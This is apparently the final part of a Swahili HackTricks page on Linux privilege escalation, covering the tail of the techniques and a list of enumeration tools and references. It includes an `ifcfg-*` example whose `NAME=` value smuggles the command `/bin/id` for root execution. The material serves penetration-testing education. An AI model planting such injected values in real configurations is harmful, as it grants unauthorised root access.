Kwenye mfumo unaotumia kwa hakika scripts za zamani zenye privileges, agizo la `ifcfg-*` lisilowekwa kwenye quotes na linalosomwa na shell, kama `NAME=`, linaweza kuvuka mpaka wa utekelezaji wa code. Thibitisha parser, thamani na njia halisi ya kuwezesha mtandao; usihitimishe kuwa shell itatafsiri yaliyomo kutokana na jina la faili au uwepo wa NetworkManager. Wrapper inayoruhusiwa na sudo ambayo huandika ingizo la mtumiaji kwenye faili ya `ifcfg-*` na kisha kuita legacy `ifup` ni njia tofauti ya kufikia mpaka huu, hata kama mtumiaji hawezi kuhariri faili moja kwa moja.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Saraka ya `/etc/init.d` ina **scripts** za System V init (SysVinit), **mfumo wa kawaida wa zamani wa kusimamia huduma za Linux**. Ina scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana kwenye `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **kusimamia huduma** ulioletwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya kuhamia Upstart, scripts za SysVinit bado hutumika pamoja na usanidi wa Upstart kutokana na safu ya uoanifu ya Upstart.

**systemd** ni mfumo wa kisasa wa kuanzisha na kusimamia huduma, unaotoa vipengele vya kina kama vile kuanzisha daemon inapohitajika, kusimamia automount, na kuhifadhi snapshots za hali ya mfumo. Hupanga faili kwenye `/usr/lib/systemd/` kwa vifurushi vya usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, na kurahisisha usimamizi wa mfumo.<sup>[[21]](#references)</sup>

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoka kwenye restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: matumizi mabaya ya manager channel

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua utendaji wa kernel wenye priviliji kwa manager wa userspace. Uthibitishaji dhaifu wa manager (kwa mfano, ukaguzi wa signature unaotegemea mpangilio wa FD au mifumo mibovu ya password) unaweza kuruhusu app ya ndani kujifanya manager na kupata root kwenye vifaa ambavyo tayari vime-rootiwa. Pata maelezo zaidi na jinsi ya kutumia udhaifu huu hapa:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Ugunduzi wa huduma ya VMware Tools LPE (CWE-426) kupitia exec inayotegemea regex (CVE-2025-41244)

Ugunduzi wa huduma unaotegemea regex katika VMware Tools/Aria Operations unaweza kutoa njia ya binary kutoka kwenye command line za michakato na kuitekeleza kwa -v katika muktadha wenye priviliji. Miundo ya ruhusa pana (kwa mfano, inayotumia \S) inaweza kulingana na listeners zilizowekwa na mshambuliaji katika maeneo yanayoweza kuandikika (kwa mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Pata maelezo zaidi na uone muundo wa jumla unaoweza kutumika kwa stack nyingine za ugunduzi/ufuatiliaji hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana za Linux/Unix Privesc

### **Zana bora ya kutafuta vectors za Linux local privilege escalation:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(chaguo la -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha kernel vulns kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (ufikiaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, matumizi tena ya zip -P creds)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload ya .text_sig iliyoghushiwa kwa monitor inayoendeshwa na cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: kupita Neighborhood Watch (utekaji wa sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Misingi ya Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Mwongozo wa Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Shambulia na Jilinde: Mbinu za Linux Privilege Escalation za 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hakuna anayetarajia utekelezaji wa command!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Maelekezo ya Mazoezi ya Maabara - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Vidokezo na Mbinu za Linux Privilege Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Zana ya Linux Enumeration na Privilege Escalation](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket ni nini?](https://www.linux.com/news/what-socket/)
- [15] [Maelezo ya Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Tumia D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Sehemu ya 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jinsi ya kusimamia ACLs kwenye Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root kupitia network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd ni nini?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection kupitia logs, mnyororo mzima)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Mwongozo wa GNU Bash – BASH_ENV (faili ya kuanzisha isiyo ya interactive)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (nakala ya pg_basebackup cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Ipe jina lolote, VMware hulipandisha (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Kupandisha Priviliji kwa Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Udhaifu wa Sudo wa CVE-2025-32462 na CVE-2025-32463 wa kupandisha priviliji](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Iliyovinjariwa](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Saraka za Hifadhi ya PYC](https://peps.python.org/pep-3147/)
- [32] [Nyaraka za Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet ya @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Kurekodi Passwords kwenye Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Maelezo ya Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
